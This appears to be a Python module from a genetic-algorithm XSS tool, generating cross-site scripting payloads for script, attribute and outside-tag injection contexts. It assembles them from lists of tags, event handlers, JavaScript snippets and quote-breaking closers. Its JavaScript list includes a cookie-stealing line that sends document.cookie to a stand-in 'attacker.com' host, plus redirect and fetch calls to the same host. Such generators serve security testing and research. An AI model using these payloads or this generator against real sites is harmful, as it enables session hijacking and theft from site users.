"""
GAXSS Payload Generator (Generic)
Generates context-aware XSS payloads based on DNA encoding
"""

import random
from typing import List, Optional
from ga_core import GAXSS_DNA, GAXSS_Mutations


class PayloadComponentLibrary:
    """Library of payload components for XSS attacks."""

    TAGS = ['img', 'svg', 'script', 'body', 'iframe', 'embed', 'object',
            'video', 'audio', 'details', 'input', 'button', 'marquee', 'meta', 'link']

    EVENTS = ['onerror', 'onload', 'onclick', 'onmouseover', 'onmouseenter',
              'onkeydown', 'onchange', 'onfocus', 'onblur', 'ondrag',
              'onwheel', 'ontouchstart', 'onpaste', 'oncontextmenu', 'onmousemove']

    JS_CODE = ['alert(1)', 'alert(document.domain)', 'console.log(1)',
               'fetch("http://attacker.com")', 'document.location="http://attacker.com"',
               'new Image().src="http://attacker.com?c="+document.cookie',
               'XMLHttpRequest', 'document.write(1)', 'throw new Error(1)',
               'setInterval(function(){},0)', 'setTimeout(alert,0,1)', 'Function("alert(1)")()']

    ATTRIBUTES = ['src=', 'href=', 'data=', 'poster=', 'formaction=',
                  'action=', 'onfocus=', 'autofocus=', 'onload=',
                  'style=', 'id=', 'class=', 'name=', 'value=', 'placeholder=']

    PROTOCOLS = ['javascript:', 'data:text/html,', 'vbscript:', 'file://', 'about:']

    CLOSING_TAGS = ['>', '"/>', "'/>", '"/onload="', '\'">', '\">', 'alert(1)"/>', 'x"><']


class GAXSS_PayloadGenerator:
    """Generate payloads from DNA encoding with context awareness."""

    CONTEXT_SCRIPT = 0
    CONTEXT_ATTRIBUTE = 1
    CONTEXT_OUTSIDE = 2

    def __init__(self):
        self.library = PayloadComponentLibrary()

    def is_well_formed(self, payload: str) -> bool:
        """Check if payload is syntactically valid."""
        open_brackets = payload.count('<')
        close_brackets = payload.count('>')
        
        if abs(open_brackets - close_brackets) > 1:
            return False
        
        double_quotes = payload.count('"')
        single_quotes = payload.count("'")
        
        if double_quotes % 2 != 0:
            return False
        if single_quotes % 2 != 0:
            return False
        
        if '""' in payload or "''" in payload:
            return False
        
        return True

    def apply_safe_mutations(self, payload: str, dna: GAXSS_DNA) -> str:
        """Apply mutations while maintaining payload validity."""
        for mutation_idx in dna.mutations:
            mutated = GAXSS_Mutations.apply_mutation(payload, mutation_idx)
            
            if self.is_well_formed(mutated):
                payload = mutated
        
        return payload

    def generate_payload_type1(self, dna: GAXSS_DNA) -> str:
        """Generate Type 1 payload: Between <script> tags."""
        js_code = self.library.JS_CODE[dna.main[2] % len(self.library.JS_CODE)]
        payload = f";{js_code}//"

        payload = self.apply_safe_mutations(payload, dna)
        return payload

    def generate_payload_type2(self, dna: GAXSS_DNA) -> str:
        """Generate Type 2 payload: In HTML attributes."""
        closing = self.library.CLOSING_TAGS[dna.closing[0] % len(self.library.CLOSING_TAGS)]
        event = self.library.EVENTS[dna.main[1] % len(self.library.EVENTS)]
        js_code = self.library.JS_CODE[dna.main[2] % len(self.library.JS_CODE)]

        payload = f'{closing} {event}="{js_code}" x="'

        payload = self.apply_safe_mutations(payload, dna)
        return payload

    def generate_payload_type3(self, dna: GAXSS_DNA) -> str:
        """Generate Type 3 payload: Outside HTML tags."""
        tag = self.library.TAGS[dna.main[0] % len(self.library.TAGS)]
        event = self.library.EVENTS[dna.main[1] % len(self.library.EVENTS)]
        js_code = self.library.JS_CODE[dna.main[2] % len(self.library.JS_CODE)]

        payload = f'<{tag} {event}="{js_code}">'

        payload = self.apply_safe_mutations(payload, dna)
        return payload

    def generate_payload(self, dna: GAXSS_DNA, context: Optional[int] = None) -> str:
        """Generate payload from DNA."""
        if context is None:
            context = random.randint(0, 2)

        if context == self.CONTEXT_SCRIPT:
            return self.generate_payload_type1(dna)
        elif context == self.CONTEXT_ATTRIBUTE:
            return self.generate_payload_type2(dna)
        else:
            return self.generate_payload_type3(dna)
